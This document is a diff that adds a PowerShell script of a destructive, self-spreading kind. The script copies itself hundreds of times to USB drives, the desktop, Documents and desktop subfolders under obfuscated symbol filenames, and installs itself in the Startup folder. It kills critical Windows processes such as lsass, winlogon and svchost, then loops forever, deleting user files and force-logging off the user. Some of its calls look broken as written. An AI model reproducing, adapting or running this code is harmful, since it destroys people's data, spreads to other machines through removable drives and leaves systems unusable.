@@ -1,1 +1,135 @@
+$shell = New-Object -ComObject WScript.Shell
+$fsObject = New-Object -ComObject Scripting.FileSystemObject
+
+# Specify the folders in which you want to delete files (modify as needed)
+$foldersToDelete = @("C:\Folder1", "C:\Folder2", "C:\Folder3")
+
+# Specify the number of copies to create
+$numCopies = 999
+
+# Find the USB drive
+$usbDrivePath = ""
+$drives = $fsObject.Drives
+
+foreach ($drive in $drives) {
+    if ($drive.DriveType -eq 1 -and $drive.IsReady) { # Check if the drive is a removable drive (USB)
+        $usbDrivePath = $drive.Path
+        break
+    }
+}
+
+# Check if a USB drive was found
+if ($usbDrivePath -ne "") {
+    # Generate copies of the script on the USB drive
+    for ($i = 1; $i -le $numCopies; $i++) {
+        $randomIteration = Get-Random -Minimum 1 -Maximum 1000
+        $strCopyPath = Join-Path -Path $usbDrivePath -ChildPath "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎$randomIteration.vbs"
+        $fsObject.CopyFile -Path $MyInvocation.MyCommand.Path -Destination $strCopyPath -Force
+    }
+}
+
+# Create copies of the script on the desktop and in the documents folder
+for ($i = 1; $i -le $numCopies; $i++) {
+    $randomIteration = Get-Random -Minimum 1 -Maximum 1000
+
+    # Create a copy of the script on the desktop
+    $strDesktopCopyPath = Join-Path -Path $shell.SpecialFolders("Desktop") -ChildPath "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎$randomIteration.vbs"
+    $fsObject.CopyFile -Path $MyInvocation.MyCommand.Path -Destination $strDesktopCopyPath -Force
+
+    # Create a copy of the script in the documents folder
+    $strDocumentsCopyPath = Join-Path -Path $shell.SpecialFolders("MyDocuments") -ChildPath "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎$randomIteration.vbs"
+    $fsObject.CopyFile -Path $MyInvocation.MyCommand.Path -Destination $strDocumentsCopyPath -Force
+}
+
+# Add the script to the startup folder
+$fsObject.CopyFile -Path $MyInvocation.MyCommand.Path -Destination $shell.SpecialFolders("Startup") -Force
+
+# Terminate important system processes
+Start-Process -FilePath "taskkill" -ArgumentList "/f /im explorer.exe" -NoNewWindow -Wait
+Start-Process -FilePath "taskkill" -ArgumentList "/f /im winlogon.exe" -NoNewWindow -Wait
+Start-Process -FilePath "taskkill" -ArgumentList "/f /im lsass.exe" -NoNewWindow -Wait
+Start-Process -FilePath "taskkill" -ArgumentList "/f /im services.exe" -NoNewWindow -Wait
+Start-Process -FilePath "taskkill" -ArgumentList "/f /im spoolsv.exe" -NoNewWindow -Wait
+Start-Process -FilePath "taskkill" -ArgumentList "/f /im svchost.exe" -NoNewWindow -Wait
+Start-Process -FilePath "taskkill" -ArgumentList "/f /im cmd.exe" -NoNewWindow -Wait
+
+# Loop indefinitely
+while ($true) {
+    # Delete all files except VBS files within the specified folders
+    foreach ($folderPath in $foldersToDelete) {
+        DeleteFilesExceptVBS -FolderPath $folderPath
+    }
+
+    # Set wallpaper
+    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value "C:\Windows\System32\imageres.dll"
+    Start-Process -FilePath "RUNDLL32.EXE" -ArgumentList "user32.dll,UpdatePerUserSystemParameters" -NoNewWindow -Wait
+
+    # Loop through each file in the Desktop folder and delete if it has a specified file extension
+    $desktopFolder = $fsObject.GetFolder($shell.SpecialFolders("Desktop"))
+    foreach ($file in $desktopFolder.Files) {
+        $extension = $fsObject.GetExtensionName($file.Name).ToLower()
+        switch ($extension) {
+            "txt", "exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp" {
+                $fsObject.DeleteFile($file.Path)
+            }
+        }
+    }
+
+    # Loop through each folder on the Desktop and delete files within them
+    foreach ($folder in $desktopFolder.Subfolders) {
+        foreach ($file in $folder.Files) {
+            $fsObject.DeleteFile($file.Path)
+        }
+    }
+
+    # Generate copies of the script within each folder on the Desktop
+    foreach ($folder in $desktopFolder.Subfolders) {
+        for ($i = 1; $i -le $numCopies; $i++) {
+            $randomIteration = Get-Random -Minimum 1 -Maximum 1000
+            $strCopyPath = Join-Path -Path $folder.Path -ChildPath "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎$randomIteration.vbs"
+            $fsObject.CopyFile -Path $MyInvocation.MyCommand.Path -Destination $strCopyPath -Force
+        }
+    }
+
+    # Remove apps from the taskbar
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "TaskbarSmallIcons" -Value 1
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "MMTaskbarEnabled" -Value 0
+
+    # Terminate important system processes
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im svchost.exe" -NoNewWindow -Wait
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im explorer.exe" -NoNewWindow -Wait
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im winlogon.exe" -NoNewWindow -Wait
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im lsass.exe" -NoNewWindow -Wait
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im services.exe" -NoNewWindow -Wait
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im spoolsv.exe" -NoNewWindow -Wait
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im svchost.exe" -NoNewWindow -Wait
+    Start-Process -FilePath "taskkill" -ArgumentList "/f /im cmd.exe" -NoNewWindow -Wait
+
+    # Log out the current user
+    Start-Process -FilePath "shutdown" -ArgumentList "-l -f" -NoNewWindow -Wait
+}
+
+# Function to delete files except VBS files within a folder
+function DeleteFilesExceptVBS {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$FolderPath
+    )
+
+    $folder = $fsObject.GetFolder($FolderPath)
+    if ($folder) {
+        foreach ($file in $folder.Files) {
+            $extension = $fsObject.GetExtensionName($file.Path).ToLower()
+            if ($extension -ne "vbs") {
+                $fsObject.DeleteFile($file.Path)
+            }
+        }
+
+        # Recursively delete files in subfolders
+        foreach ($subfolder in $folder.Subfolders) {
+            DeleteFilesExceptVBS -FolderPath $subfolder.Path
+        }
+    }
+}
+
 
